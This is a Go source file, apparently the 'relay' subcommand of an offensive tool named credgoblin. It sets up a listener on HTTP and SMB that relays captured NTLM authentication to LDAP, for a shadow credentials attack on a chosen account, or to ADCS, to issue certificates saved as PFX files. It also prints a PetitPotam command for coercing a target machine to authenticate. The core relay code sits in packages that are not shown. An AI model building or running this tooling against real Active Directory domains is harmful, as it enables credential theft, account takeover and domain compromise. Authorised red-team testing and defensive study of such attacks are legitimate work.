package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/ineffectivecoder/credgoblin/pkg/config"
	"github.com/ineffectivecoder/credgoblin/pkg/output"
	"github.com/ineffectivecoder/credgoblin/pkg/relay"
	"github.com/mjwhitta/cli"
)

func runRelay() {
	cfg := config.DefaultRelayConfig()

	// Configure CLI for relay subcommand
	cli.Banner = "credgoblin relay [OPTIONS]"
	cli.Info(
		"Relays NTLM authentication to LDAP and performs shadow credentials attack.",
		"This feature is planned for Phase 2.",
	)

	cli.Flag(
		&cfg.ListenAddr,
		"i", "interface",
		cfg.ListenAddr,
		"IP address to listen on.",
	)

	cli.Flag(
		&cfg.TargetURL,
		"t", "target",
		cfg.TargetURL,
		"Target LDAP URL (e.g., ldap://dc.domain.local).",
	)

	cli.Flag(
		&cfg.TargetDomain,
		"d", "domain",
		cfg.TargetDomain,
		"Target domain for certificate UPN (e.g., domain.local). Required when target is an IP address.",
	)

	cli.Flag(
		&cfg.TargetUser,
		"u", "target-user",
		cfg.TargetUser,
		"Target user/computer DN to modify.",
	)

	cli.Flag(
		&cfg.OutputPath,
		"o", "output",
		cfg.OutputPath,
		"Output path for PFX certificate.",
	)

	cli.Flag(
		&cfg.PFXPassword,
		"P", "pfx-pass",
		cfg.PFXPassword,
		"PFX password (random if not set).",
	)

	cli.Flag(
		&cfg.Verbose,
		"v", "verbose",
		cfg.Verbose,
		"Enable verbose output.",
	)

	cli.Flag(
		&cfg.RelayMode,
		"m", "mode",
		cfg.RelayMode,
		"Relay mode: ldap or adcs.",
	)

	cli.Flag(
		&cfg.TemplateName,
		"T", "template",
		cfg.TemplateName,
		"Certificate template name for ADCS relay (e.g., User, Machine).",
	)

	cli.Flag(
		&cfg.ListenPorts,
		"p", "ports",
		cfg.ListenPorts,
		"Ports to listen on: 80 (HTTP), 445 (SMB), or both (default: both).",
	)

	// Parse flags
	cli.Parse()

	// Validate required flags
	if cfg.TargetURL == "" {
		fmt.Println("Error: --target is required")
		fmt.Println()
		os.Exit(1)
	}

	// Mode-specific validation
	if cfg.RelayMode == "adcs" {
		if cfg.TemplateName == "" {
			fmt.Println("Error: --template is required for ADCS relay mode")
			fmt.Println()
			os.Exit(1)
		}
	} else {
		// LDAP mode requires target user
		if cfg.TargetUser == "" {
			fmt.Println("Error: --target-user is required for LDAP relay mode")
			fmt.Println()
			os.Exit(1)
		}
	}

	// Create logger
	logger := output.NewLogger(cfg.Verbose)

	// Print banner
	printBanner(logger)

	// Check if we have permission to bind to port 445
	if os.Geteuid() != 0 {
		logger.Warning("Not running as root - may fail to bind to port 445")
	}

	// Note: OutputPath defaults to "" to allow handlers to generate username-based filenames
	// Handlers will use <username>.pfx if OutputPath is empty

	logger.Info(fmt.Sprintf("Relay Mode: %s", cfg.RelayMode))
	logger.Info(fmt.Sprintf("Target: %s", cfg.TargetURL))
	if cfg.RelayMode == "adcs" {
		logger.Info(fmt.Sprintf("Certificate Template: %s", cfg.TemplateName))
		if cfg.OutputPath != "" {
			logger.Info(fmt.Sprintf("Output PFX: %s", cfg.OutputPath))
		} else {
			logger.Info("Output PFX: <username>.pfx (auto-generated)")
		}
	} else {
		logger.Info(fmt.Sprintf("Target User: %s", cfg.TargetUser))
		if cfg.OutputPath != "" {
			logger.Info(fmt.Sprintf("Output PFX: %s", cfg.OutputPath))
		}
	}

	// Create relay config
	relayConfig := &relay.Config{
		ListenAddr:   cfg.ListenAddr,
		ListenPorts:  cfg.ListenPorts,
		TargetURL:    cfg.TargetURL,
		TargetDomain: cfg.TargetDomain,
		TargetUser:   cfg.TargetUser,
		OutputPath:   cfg.OutputPath,
		PFXPassword:  cfg.PFXPassword,
		Verbose:      cfg.Verbose,
		RelayMode:    cfg.RelayMode,
		TemplateName: cfg.TemplateName,
	}

	// Create relay server
	server := relay.NewServer(relayConfig, logger)

	// Create context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Handle signals for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-sigChan
		logger.Info("Shutting down...")
		cancel()
	}()

	// Start server
	if err := server.Start(ctx); err != nil {
		logger.Fatal(fmt.Sprintf("Failed to start relay server: %v", err))
	}

	logger.Info("Waiting for incoming connection to relay...")
	logger.Info("Press Ctrl+C to stop")
	logger.Info("")
	logger.Info("To test with PetitPotam:")
	logger.Info(fmt.Sprintf("  python3 PetitPotam.py %s <target-ip>", cfg.ListenAddr))
	logger.Info("")
	logger.Info("To test connectivity:")
	if cfg.ListenPorts == "80" || cfg.ListenPorts == "both" {
		logger.Info(fmt.Sprintf("  curl http://%s/test", cfg.ListenAddr))
	}
	if cfg.ListenPorts == "445" || cfg.ListenPorts == "both" {
		logger.Info(fmt.Sprintf("  nc -zv %s 445", cfg.ListenAddr))
	}
	logger.Info("")

	// Wait for context cancellation
	<-ctx.Done()

	// Stop server
	if err := server.Stop(); err != nil {
		logger.Error(fmt.Sprintf("Error stopping server: %v", err))
	}

	logger.Info("Relay server stopped")
}
